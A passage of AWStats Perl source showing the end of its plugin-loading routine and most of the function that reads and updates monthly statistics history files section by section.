                                # TODO Use $PluginsLoaded{"$elem"}="$pluginname"; for unique func
                                $PluginsLoaded{"$elem"}{"$pluginname"} = 1;
                            }
                            else { $PluginsLoaded{"$elem"}{"$pluginname"} = 1; }
                            if ( "$elem" =~ /SectionInitHashArray/ ) {
                                $AtLeastOneSectionPlugin = 1;
                            }
                        }
                        $PluginsLoaded{'init'}{"$pluginname"} = 1;
                        if ($Debug) {
                            debug(
                                " Plugin '$pluginname' now hooks functions '$initret'",
                                1
                            );
                        }
                        last;
                    }
                }
                if ( !$PluginsLoaded{'init'}{"$pluginname"} ) {
                    error(
                        "AWStats config file contains a directive to load plugin \"$pluginname\" (LoadPlugin=\"$plugininfo\") but AWStats can't open plugin file \"$pluginfile.pm\" for read.\nCheck if file is in \""
                            . ( $PossiblePluginsDir[0] )
                            . "\" directory and is readable." );
                }
            }
            else {
                warning(
                    "Warning: Tried to load plugin \"$pluginname\" twice. Fix config file."
                );
            }
        }
        else {
            error("Plugin \"$pluginfile\" is not a valid plugin name.");
        }
    }

    # In output mode, geo ip plugins are not loaded, so message changes are done here (can't be done in plugin init function)
    if (   $PluginsLoaded{'init'}{'geoip'}
        || $PluginsLoaded{'init'}{'geoip6'}
        || $PluginsLoaded{'init'}{'geoipfree'}
        || $PluginsLoaded{'init'}{'geoip2_country'})
    {
        $Message[17] = $Message[25] = $Message[148];
    }
}

#------------------------------------------------------------------------------
# Function:		Read history file and create or update tmp history file
# Parameters:	year,month,day,hour,withupdate,withpurge,part_to_load[,lastlinenb,lastlineoffset,lastlinechecksum]
# Input:		$DirData $PROG $FileSuffix $LastLine $DatabaseBreak
# Output:		None
# Return:		Tmp history file name created/updated or '' if withupdate is 0
#------------------------------------------------------------------------------
sub Read_History_With_TmpUpdate {

    my $year  = sprintf( "%04i", shift || 0 );
    my $month = sprintf( "%02i", shift || 0 );
    my $day   = shift;
    if ( $day ne '' ) { $day = sprintf( "%02i", $day ); }
    my $hour = shift;
    if ( $hour ne '' ) { $hour = sprintf( "%02i", $hour ); }
    my $withupdate = shift || 0;
    my $withpurge  = shift || 0;
    my $part       = shift || '';

    my ( $date, $filedate ) = ( '', '' );
    if ( $DatabaseBreak eq 'month' ) {
        $date     = sprintf( "%04i%02i", $year,  $month );
        $filedate = sprintf( "%02i%04i", $month, $year );
    }
    elsif ( $DatabaseBreak eq 'year' ) {
        $date     = sprintf( "%04i%", $year );
        $filedate = sprintf( "%04i",  $year );
    }
    elsif ( $DatabaseBreak eq 'day' ) {
        $date     = sprintf( "%04i%02i%02i", $year,  $month, $day );
        $filedate = sprintf( "%02i%04i%02i", $month, $year,  $day );
    }
    elsif ( $DatabaseBreak eq 'hour' ) {
        $date     = sprintf( "%04i%02i%02i%02i", $year,  $month, $day, $hour );
        $filedate = sprintf( "%02i%04i%02i%02i", $month, $year,  $day, $hour );
    }

    my $xml   = ( $BuildHistoryFormat eq 'xml' ? 1 : 0 );
    my $xmleb = '</table><nu>';
    my $xmlrb = '<tr><td>';

    my $lastlinenb       = shift || 0;
    my $lastlineoffset   = shift || 0;
    my $lastlinechecksum = shift || 0;

    my %allsections = (
        'general'               => 1,
        'misc'                  => 2,
        'time'                  => 3,
        'visitor'               => 4,
        'day'                   => 5,
        'domain'                => 6,
        'cluster'               => 7,
        'login'                 => 8,
        'robot'                 => 9,
        'worms'                 => 10,
        'emailsender'           => 11,
        'emailreceiver'         => 12,
        'session'               => 13,
        'sider'                 => 14,
        'filetypes'             => 15,
        'downloads'				=> 16,
        'os'                    => 17,
        'browser'               => 18,
        'screensize'            => 19,
        'unknownreferer'        => 20,
        'unknownrefererbrowser' => 21,
        'origin'                => 22,
        'sereferrals'           => 23,
        'pagerefs'              => 24,
        'searchwords'           => 25,
        'keywords'              => 26,
        'errors'                => 27,
        'filesize'              => 28,
        'requesttime'           => 29,
    );

    my $order = ( scalar keys %allsections ) + 1;
    foreach ( keys %TrapInfosForHTTPErrorCodes ) {
        $allsections{"sider_$_"} = $order++;
    }
    foreach ( 1 .. @ExtraName - 1 ) { $allsections{"extra_$_"} = $order++; }
    foreach ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) {
        $allsections{"plugin_$_"} = $order++;
    }
    my $withread = 0;

    # Variable used to read old format history files
    my $readvisitorforbackward = 0;

    if ($Debug) {
        debug(
            "Call to Read_History_With_TmpUpdate [$year,$month,$day,$hour,withupdate=$withupdate,withpurge=$withpurge,part=$part,lastlinenb=$lastlinenb,lastlineoffset=$lastlineoffset,lastlinechecksum=$lastlinechecksum]"
        );
    }
    if ($Debug) { debug("date=$date"); }

    # Define SectionsToLoad (which sections to load)
    my %SectionsToLoad = ();
    if ( $part eq 'all' ) {    # Load all needed sections
        my $order = 1;
        $SectionsToLoad{'general'} = $order++;

        # When
        $SectionsToLoad{'time'} = $order
            ++; # Always loaded because needed to count TotalPages, TotalHits, TotalBandwidth
        if (   $UpdateStats
            || $MigrateStats
            || ( $HTMLOutput{'main'} && $ShowHostsStats )
            || $HTMLOutput{'allhosts'}
            || $HTMLOutput{'lasthosts'}
            || $HTMLOutput{'unknownip'} )
        {
            $SectionsToLoad{'visitor'} = $order++;
        }     # Must be before day, sider and session section
        if (
            $UpdateStats
                || $MigrateStats
                || ( $HTMLOutput{'main'}
                && ( $ShowDaysOfWeekStats || $ShowDaysOfMonthStats ) )
                || $HTMLOutput{'alldays'}
        )
        {
            $SectionsToLoad{'day'} = $order++;
        }

        # Who
        if (   $UpdateStats
            || $MigrateStats
            || ( $HTMLOutput{'main'} && $ShowDomainsStats )
            || $HTMLOutput{'alldomains'} )
        {
            $SectionsToLoad{'domain'} = $order++;
        }
        if (   $UpdateStats
            || $MigrateStats
            || ( $HTMLOutput{'main'} && $ShowAuthenticatedUsers )
            || $HTMLOutput{'alllogins'}
            || $HTMLOutput{'lastlogins'} )
        {
            $SectionsToLoad{'login'} = $order++;
        }
        if (   $UpdateStats
            || $MigrateStats
            || ( $HTMLOutput{'main'} && $ShowRobotsStats )
            || $HTMLOutput{'allrobots'}
            || $HTMLOutput{'lastrobots'} )
        {
            $SectionsToLoad{'robot'} = $order++;
        }
        if (   $UpdateStats
            || $MigrateStats
            || ( $HTMLOutput{'main'} && $ShowWormsStats )
            || $HTMLOutput{'allworms'}
            || $HTMLOutput{'lastworms'} )
        {
            $SectionsToLoad{'worms'} = $order++;
        }
        if (   $UpdateStats
            || $MigrateStats
            || ( $HTMLOutput{'main'} && $ShowEMailSenders )
            || $HTMLOutput{'allemails'}
            || $HTMLOutput{'lastemails'} )
        {
            $SectionsToLoad{'emailsender'} = $order++;
        }
        if (   $UpdateStats
            || $MigrateStats
            || ( $HTMLOutput{'main'} && $ShowEMailReceivers )
            || $HTMLOutput{'allemailr'}
            || $HTMLOutput{'lastemailr'} )
        {
            $SectionsToLoad{'emailreceiver'} = $order++;
        }

        # Navigation
        if (   $UpdateStats
            || $MigrateStats
            || ( $HTMLOutput{'main'} && $ShowSessionsStats )
            || $HTMLOutput{'sessions'} )
        {
            $SectionsToLoad{'session'} = $order++;
        }
        if (   $UpdateStats
            || $MigrateStats
            || ($HTMLOutput{'main'} && $ShowFileSizesStats)
            || $HTMLOutput{'filesizes'} )
        {
            $SectionsToLoad{'filesize'} = $order++;
        }
        if (   $UpdateStats
            || $MigrateStats
            || ( $HTMLOutput{'main'} && $ShowRequestTimesStats )
            || $HTMLOutput{'requesttime'} )
        {
            $SectionsToLoad{'requesttime'} = $order++;
        }
        if (   $UpdateStats
            || $MigrateStats
            || ( $HTMLOutput{'main'} && $ShowPagesStats )
            || $HTMLOutput{'urldetail'}
            || $HTMLOutput{'urlentry'}
            || $HTMLOutput{'urlexit'} )
        {
            $SectionsToLoad{'sider'} = $order++;
        }
        if (   $UpdateStats
            || $MigrateStats
            || ( $HTMLOutput{'main'} && $ShowFileTypesStats )
            || $HTMLOutput{'filetypes'} )
        {
            $SectionsToLoad{'filetypes'} = $order++;
        }

        if ( $UpdateStats
            || $MigrateStats
            || ($HTMLOutput{'main'} && $ShowDownloadsStats )
            || $HTMLOutput{'downloads'} )
        {
            $SectionsToLoad{'downloads'} = $order++;
        }
        if (   $UpdateStats
            || $MigrateStats
            || ( $HTMLOutput{'main'} && $ShowOSStats )
            || $HTMLOutput{'osdetail'} )
        {
            $SectionsToLoad{'os'} = $order++;
        }
        if (   $UpdateStats
            || $MigrateStats
            || ( $HTMLOutput{'main'} && $ShowBrowsersStats )
            || $HTMLOutput{'browserdetail'} )
        {
            $SectionsToLoad{'browser'} = $order++;
        }
        if ( $UpdateStats || $MigrateStats || $HTMLOutput{'unknownos'} ) {
            $SectionsToLoad{'unknownreferer'} = $order++;
        }
        if ( $UpdateStats || $MigrateStats || $HTMLOutput{'unknownbrowser'} ) {
            $SectionsToLoad{'unknownrefererbrowser'} = $order++;
        }
        if (   $UpdateStats
            || $MigrateStats
            || ( $HTMLOutput{'main'} && $ShowScreenSizeStats ) )
        {
            $SectionsToLoad{'screensize'} = $order++;
        }

        # Referers
        if (   $UpdateStats
            || $MigrateStats
            || ( $HTMLOutput{'main'} && $ShowOriginStats )
            || $HTMLOutput{'origin'} )
        {
            $SectionsToLoad{'origin'} = $order++;
        }
        if (   $UpdateStats
            || $MigrateStats
            || ( $HTMLOutput{'main'} && $ShowOriginStats )
            || $HTMLOutput{'refererse'} )
        {
            $SectionsToLoad{'sereferrals'} = $order++;
        }
        if (   $UpdateStats
            || $MigrateStats
            || ( $HTMLOutput{'main'} && $ShowOriginStats )
            || $HTMLOutput{'refererpages'} )
        {
            $SectionsToLoad{'pagerefs'} = $order++;
        }
        if (   $UpdateStats
            || $MigrateStats
            || ( $HTMLOutput{'main'} && $ShowKeyphrasesStats )
            || $HTMLOutput{'keyphrases'}
            || $HTMLOutput{'keywords'} )
        {
            $SectionsToLoad{'searchwords'} = $order++;
        }
        if ( !$withupdate && $HTMLOutput{'main'} && $ShowKeywordsStats ) {
            $SectionsToLoad{'keywords'} = $order++;
        }    # If we update, there is no need to load
        # Others
        if (   $UpdateStats
            || $MigrateStats
            || ( $HTMLOutput{'main'} && $ShowMiscStats ) )
        {
            $SectionsToLoad{'misc'} = $order++;
        }
        if (
            $UpdateStats
                || $MigrateStats
                || ( $HTMLOutput{'main'}
                && ( $ShowHTTPErrorsStats || $ShowSMTPErrorsStats ) )
                || $HTMLOutput{'errors'}
        )
        {
            $SectionsToLoad{'errors'} = $order++;
        }
        foreach ( keys %TrapInfosForHTTPErrorCodes ) {
            if ( $UpdateStats || $MigrateStats || $HTMLOutput{"errors$_"} ) {
                $SectionsToLoad{"sider_$_"} = $order++;
            }
        }
        if (   $UpdateStats
            || $MigrateStats
            || ( $HTMLOutput{'main'} && $ShowClusterStats ) )
        {
            $SectionsToLoad{'cluster'} = $order++;
        }
        foreach ( 1 .. @ExtraName - 1 ) {
            if (   $UpdateStats
                || $MigrateStats
                || ( $HTMLOutput{'main'} && $ExtraStatTypes[$_] )
                || $HTMLOutput{"allextra$_"} )
            {
                $SectionsToLoad{"extra_$_"} = $order++;
            }
        }
        foreach ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) {
            if ( $UpdateStats || $MigrateStats || $HTMLOutput{"plugin_$_"} ) {
                $SectionsToLoad{"plugin_$_"} = $order++;
            }
        }
    }
    else {    # Load only required sections
        my $order = 1;
        foreach ( split( /\s+/, $part ) ) { $SectionsToLoad{$_} = $order++; }
    }

    # Define SectionsToSave (which sections to save)
    my %SectionsToSave = ();
    if ($withupdate) {
        if ( $SectionsToBeSaved eq 'all' ) {
            %SectionsToSave = %allsections;
        }
        else {
            my $order = 1;
            foreach ( split( /\s+/, $SectionsToBeSaved ) ) {
                $SectionsToSave{$_} = $order++;
            }
        }
    }

    if ($Debug) {
        debug(
            " List of sections marked for load : "
                . join(
                ' ',
                (
                    sort { $SectionsToLoad{$a} <=> $SectionsToLoad{$b} }
                        keys %SectionsToLoad
                )
            ),
            2
        );
        debug(
            " List of sections marked for save : "
                . join(
                ' ',
                (
                    sort { $SectionsToSave{$a} <=> $SectionsToSave{$b} }
                        keys %SectionsToSave
                )
            ),
            2
        );
    }

    # Define value for filetowrite and filetoread (Month before Year kept for backward compatibility)
    my $filetowrite = '';
    my $filetoread  = '';
    if ( $HistoryAlreadyFlushed{"$year$month$day$hour"}
        && -s "$DirData/$PROG$filedate$FileSuffix.tmp.$$" )
    {

        # tmp history file was already flushed
        $filetoread  = "$DirData/$PROG$filedate$FileSuffix.tmp.$$";
        $filetowrite = "$DirData/$PROG$filedate$FileSuffix.tmp.$$.bis";
    }
    else {
        $filetoread  = "$DirData/$PROG$filedate$FileSuffix.txt";
        $filetowrite = "$DirData/$PROG$filedate$FileSuffix.tmp.$$";
    }
    if ($Debug) { debug( " History file to read is '$filetoread'", 2 ); }

    # Is there an old data file to read or, if migrate, can we open the file for read
    if ( -s $filetoread || $MigrateStats ) { $withread = 1; }

    # Open files
    if ($withread) {
        open( HISTORY, $filetoread )
            || error( "Couldn't open file \"$filetoread\" for read: $!",
            "", "", $MigrateStats );
        binmode HISTORY
        ; # Avoid premature EOF due to history files corrupted with \cZ or bin chars
    }
    if ($withupdate) {
        open( HISTORYTMP, ">$filetowrite" )
            || error("Couldn't open file \"$filetowrite\" for write: $!");
        binmode HISTORYTMP;
        if ($xml) {
            print HISTORYTMP
                '<xml xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://www.awstats.org/files/awstats.xsd">'
                    . "\n\n";
        }
        Save_History( "header", $year, $month, $date );
    }

    # Loop on read file
    my $readxml = 0;
    if ($withread) {
        my $countlines = 0;
        my $versionnum = 0;
        my @field      = ();
        while (<HISTORY>) {
            chomp $_;
            s/\r//;
            $countlines++;

            # Test if it's xml
            if ( !$readxml && $_ =~ /^<xml/ ) {
                $readxml = 1;
                if ($Debug) { debug( " Data file format is 'xml'", 1 ); }
                next;
            }

            # Extract version from first line
            if ( !$versionnum && $_ =~ /^AWSTATS DATA FILE (\d+).(\d+)/i ) {
                $versionnum = ( $1 * 1000 ) + $2;
                if ($Debug) { debug( " Data file version is $versionnum", 1 ); }
                next;
            }

            # Analyze fields
            @field = split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
            if ( !$field[0] ) { next; }

            # Here version MUST be defined
            if ( $versionnum < 5000 ) {
                error(
                    "History file '$filetoread' is to old (version '$versionnum'). This version of AWStats is not compatible with very old history files. Remove this history file or use first a previous AWStats version to migrate it from command line with command: $PROG.$Extension -migrate=\"$filetoread\".",
                    "", "", 1
                );
            }

            # BEGIN_GENERAL
            # TODO Manage GENERAL in a loop like other sections.
            if ( $field[0] eq 'BEGIN_GENERAL' ) {
                if ($Debug) { debug(" Begin of GENERAL section"); }
                next;
            }
            if ( $field[0] eq 'LastLine' || $field[0] eq "${xmlrb}LastLine" ) {
                if ( !$LastLine || $LastLine < int( $field[1] ) ) {
                    $LastLine = int( $field[1] );
                }
                if ( $field[2] ) { $LastLineNumber   = int( $field[2] ); }
                if ( $field[3] ) { $LastLineOffset   = int( $field[3] ); }
                if ( $field[4] ) { $LastLineChecksum = int( $field[4] ); }
                next;
            }
            if ( $field[0] eq 'FirstTime' || $field[0] eq "${xmlrb}FirstTime" )
            {
                if ( !$FirstTime{$date}
                    || $FirstTime{$date} > int( $field[1] ) )
                {
                    $FirstTime{$date} = int( $field[1] );
                }
                next;
            }
            if ( $field[0] eq 'LastTime' || $field[0] eq "${xmlrb}LastTime" ) {
                if ( !$LastTime{$date} || $LastTime{$date} < int( $field[1] ) )
                {
                    $LastTime{$date} = int( $field[1] );
                }
                next;
            }
            if (   $field[0] eq 'LastUpdate'
                || $field[0] eq "${xmlrb}LastUpdate" )
            {
                if ( !$LastUpdate ) { $LastUpdate = int( $field[1] ); }
                next;
            }
            if (   $field[0] eq 'TotalVisits'
                || $field[0] eq "${xmlrb}TotalVisits" )
            {
                if ( !$withupdate ) {
                    $MonthVisits{ $year . $month } += int( $field[1] );
                }
                next;
            }
            if (   $field[0] eq 'TotalUnique'
                || $field[0] eq "${xmlrb}TotalUnique" )
            {
                if ( !$withupdate ) {
                    $MonthUnique{ $year . $month } += int( $field[1] );
                }
                next;
            }
            if (   $field[0] eq 'MonthHostsKnown'
                || $field[0] eq "${xmlrb}MonthHostsKnown" )
            {
                if ( !$withupdate ) {
                    $MonthHostsKnown{ $year . $month } += int( $field[1] );
                }
                next;
            }
            if (   $field[0] eq 'MonthHostsUnknown'
                || $field[0] eq "${xmlrb}MonthHostsUnknown" )
            {
                if ( !$withupdate ) {
                    $MonthHostsUnknown{ $year . $month } += int( $field[1] );
                }
                next;
            }
            if (
                (
                    $field[0] eq 'END_GENERAL'
                        || $field[0] eq "${xmleb}END_GENERAL"
                )
            )
            {
                if ($Debug) { debug(" End of GENERAL section"); }
                if ( $MigrateStats && !$BadFormatWarning{ $year . $month } ) {
                    $BadFormatWarning{ $year . $month } = 1;
                    warning(
                        "Warning: You are migrating a file that is already a recent version (migrate not required for files version $versionnum).",
                        "", "", 1
                    );
                }

                delete $SectionsToLoad{'general'};
                if ( $SectionsToSave{'general'} ) {
                    Save_History( 'general', $year, $month, $date, $lastlinenb,
                        $lastlineoffset, $lastlinechecksum );
                    delete $SectionsToSave{'general'};
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_FILESIZE
            if ( $field[0] eq 'BEGIN_FILESIZE' ) {
                if ($Debug) { debug(" Begin of FILESIZE section"); }
                $field[0] = '';
                my $count = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'filesize'} ) {
                            $countloaded++;
                            if ($field[1]) {
                                $_filesize{ $field[0] } += $field[1];
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? CleanFromTags($_) : $_) );
                    $countlines++;
                } until ( $field[0] eq 'END_FILESIZE'
                    || $field[0] eq "${xmleb}END_FILESIZE"
                    || ! $_ );
                if (   $field[0] ne 'END_FILESIZE'
                    && $field[0] ne "${xmleb}END_FILESIZE")
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section FILESIZE not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).","","",1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of FILESIZE section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'filesize'};
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_REQUESTTIME
            if ( $field[0] eq 'BEGIN_REQUESTTIME' ) {
                if ($Debug) { debug(" Begin of REQUESTTIME section"); }
                $field[0] = '';
                my $count = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'requesttime'} ) {
                            $countloaded++;
                            if ( $field[1] ) {
                                $_requesttime{ $field[0] } += $field[1];
                            }                                                }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? CleanFromTags($_) : $_) );
                    $countlines++;
                } until ( $field[0] eq 'END_REQUESTTIME'
                    || $field[0] eq "${xmleb}END_REQUESTTIME"
                    || !$_ );
                if ( $field[0] ne 'END_REQUESTTIME'
                    && $field[0] ne "${xmleb}END_REQUESTTIME")
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section REQUESTTIME not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of _REQUESTTIME section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'requesttime'};
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_MISC
            if ( $field[0] eq 'BEGIN_MISC' ) {
                if ($Debug) { debug(" Begin of MISC section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'misc'} ) {
                            $countloaded++;
                            if ( $field[1] ) {
                                $_misc_p{ $field[0] } += int( $field[1] );
                            }
                            if ( $field[2] ) {
                                $_misc_h{ $field[0] } += int( $field[2] );
                            }
                            if ( $field[3] ) {
                                $_misc_k{ $field[0] } += int( $field[3] );
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_MISC'
                    || $field[0] eq "${xmleb}END_MISC"
                    || !$_ );
                if (   $field[0] ne 'END_MISC'
                    && $field[0] ne "${xmleb}END_MISC" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section MISC not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of MISC section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'misc'};
                if ( $SectionsToSave{'misc'} ) {
                    Save_History( 'misc', $year, $month, $date );
                    delete $SectionsToSave{'misc'};
                    if ($withpurge) {
                        %_misc_p = ();
                        %_misc_h = ();
                        %_misc_k = ();
                    }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_CLUSTER
            if ( $field[0] eq 'BEGIN_CLUSTER' ) {
                if ($Debug) { debug(" Begin of CLUSTER section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'cluster'} ) {
                            $countloaded++;
                            if ( $field[1] ) {
                                $_cluster_p{ $field[0] } += int( $field[1] );
                            }
                            if ( $field[2] ) {
                                $_cluster_h{ $field[0] } += int( $field[2] );
                            }
                            if ( $field[3] ) {
                                $_cluster_k{ $field[0] } += int( $field[3] );
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_CLUSTER'
                    || $field[0] eq "${xmleb}END_CLUSTER"
                    || !$_ );
                if (   $field[0] ne 'END_CLUSTER'
                    && $field[0] ne "${xmleb}END_CLUSTER" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section CLUSTER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of CLUSTER section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'cluster'};
                if ( $SectionsToSave{'cluster'} ) {
                    Save_History( 'cluster', $year, $month, $date );
                    delete $SectionsToSave{'cluster'};
                    if ($withpurge) {
                        %_cluster_p = ();
                        %_cluster_h = ();
                        %_cluster_k = ();
                    }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_TIME
            if ( $field[0] eq 'BEGIN_TIME' ) {
                my $monthpages          = 0;
                my $monthhits           = 0;
                my $monthbytes          = 0;
                my $monthnotviewedpages = 0;
                my $monthnotviewedhits  = 0;
                my $monthnotviewedbytes = 0;
                if ($Debug) { debug(" Begin of TIME section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {

                    if ( $field[0] ne '' )
                    {    # Test on ne '' because field[0] is '0' for hour 0)
                        $count++;
                        if ( $SectionsToLoad{'time'} ) {
                            if (   $withupdate
                                || $MonthRequired eq 'all'
                                || $MonthRequired eq "$month" )
                            {    # Still required
                                $countloaded++;
                                if ( $field[1] ) {
                                    $_time_p[ $field[0] ] += int( $field[1] );
                                }
                                if ( $field[2] ) {
                                    $_time_h[ $field[0] ] += int( $field[2] );
                                }
                                if ( $field[3] ) {
                                    $_time_k[ $field[0] ] += int( $field[3] );
                                }
                                if ( $field[4] ) {
                                    $_time_nv_p[ $field[0] ] +=
                                        int( $field[4] );
                                }
                                if ( $field[5] ) {
                                    $_time_nv_h[ $field[0] ] +=
                                        int( $field[5] );
                                }
                                if ( $field[6] ) {
                                    $_time_nv_k[ $field[0] ] +=
                                        int( $field[6] );
                                }
                            }
                            $monthpages          += int( $field[1] );
                            $monthhits           += int( $field[2] );
                            $monthbytes          += int( $field[3] );
                            $monthnotviewedpages += int( $field[4] || 0 );
                            $monthnotviewedhits  += int( $field[5] || 0 );
                            $monthnotviewedbytes += int( $field[6] || 0 );
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_TIME'
                    || $field[0] eq "${xmleb}END_TIME"
                    || !$_ );
                if (   $field[0] ne 'END_TIME'
                    && $field[0] ne "${xmleb}END_TIME" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section TIME not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of TIME section ($count entries, $countloaded loaded)"
                    );
                }
                $MonthPages{ $year . $month }          += $monthpages;
                $MonthHits{ $year . $month }           += $monthhits;
                $MonthBytes{ $year . $month }          += $monthbytes;
                $MonthNotViewedPages{ $year . $month } += $monthnotviewedpages;
                $MonthNotViewedHits{ $year . $month }  += $monthnotviewedhits;
                $MonthNotViewedBytes{ $year . $month } += $monthnotviewedbytes;
                delete $SectionsToLoad{'time'};

                if ( $SectionsToSave{'time'} ) {
                    Save_History( 'time', $year, $month, $date );
                    delete $SectionsToSave{'time'};
                    if ($withpurge) {
                        @_time_p    = ();
                        @_time_h    = ();
                        @_time_k    = ();
                        @_time_nv_p = ();
                        @_time_nv_h = ();
                        @_time_nv_k = ();
                    }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_ORIGIN
            if ( $field[0] eq 'BEGIN_ORIGIN' ) {
                if ($Debug) { debug(" Begin of ORIGIN section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'origin'} ) {
                            if ( $field[0] eq 'From0' ) {
                                $_from_p[0] += $field[1];
                                $_from_h[0] += $field[2];
                            }
                            elsif ( $field[0] eq 'From1' ) {
                                $_from_p[1] += $field[1];
                                $_from_h[1] += $field[2];
                            }
                            elsif ( $field[0] eq 'From2' ) {
                                $_from_p[2] += $field[1];
                                $_from_h[2] += $field[2];
                            }
                            elsif ( $field[0] eq 'From3' ) {
                                $_from_p[3] += $field[1];
                                $_from_h[3] += $field[2];
                            }
                            elsif ( $field[0] eq 'From4' ) {
                                $_from_p[4] += $field[1];
                                $_from_h[4] += $field[2];
                            }
                            elsif ( $field[0] eq 'From5' ) {
                                $_from_p[5] += $field[1];
                                $_from_h[5] += $field[2];
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_ORIGIN'
                    || $field[0] eq "${xmleb}END_ORIGIN"
                    || !$_ );
                if (   $field[0] ne 'END_ORIGIN'
                    && $field[0] ne "${xmleb}END_ORIGIN" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section ORIGIN not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of ORIGIN section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'origin'};
                if ( $SectionsToSave{'origin'} ) {
                    Save_History( 'origin', $year, $month, $date );
                    delete $SectionsToSave{'origin'};
                    if ($withpurge) { @_from_p = (); @_from_h = (); }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_DAY
            if ( $field[0] eq 'BEGIN_DAY' ) {
                if ($Debug) { debug(" Begin of DAY section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'day'} ) {
                            $countloaded++;
                            if ( $field[1] ) {
                                $DayPages{ $field[0] } += int( $field[1] );
                            }
                            $DayHits{ $field[0] } +=
                                int( $field[2] )
                            ; # DayHits always load (should be >0 and if not it's a day YYYYMM00 resulting of an old file migration)
                            if ( $field[3] ) {
                                $DayBytes{ $field[0] } += int( $field[3] );
                            }
                            if ( $field[4] ) {
                                $DayVisits{ $field[0] } += int( $field[4] );
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_DAY'
                    || $field[0] eq "${xmleb}END_DAY"
                    || !$_ );
                if ( $field[0] ne 'END_DAY' && $field[0] ne "${xmleb}END_DAY" )
                {
                    error(
